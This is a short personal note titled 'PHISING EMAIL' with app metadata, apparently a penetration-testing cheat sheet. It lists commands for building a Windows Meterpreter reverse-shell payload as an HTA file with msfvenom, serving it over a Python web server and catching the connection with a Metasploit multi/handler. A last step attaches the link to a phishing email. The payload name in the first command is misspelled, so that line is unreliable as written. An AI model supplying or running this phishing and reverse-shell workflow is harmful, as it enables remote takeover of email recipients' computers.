---
title: PHISING EMAIL
updated: 2023-11-03 06:24:01Z
created: 2023-11-03 04:14:25Z
latitude: -33.86881970
longitude: 151.20929550
altitude: 0.0000
---

1. Create payload and host it
`msfvenom -p windows/x64/metrepreter/reverse_tcp LHOST=<kali> LPORT=443 -f hta-psh -o file.hta` 
`python3 -m http.server 80`
2. Set listener
`msfconsole`
`use multi/handler`
`set payload windows/x64/meterpreter/reverse_tcp`
set options and `exploit -j`
3. Attach link to hosted file.hta in email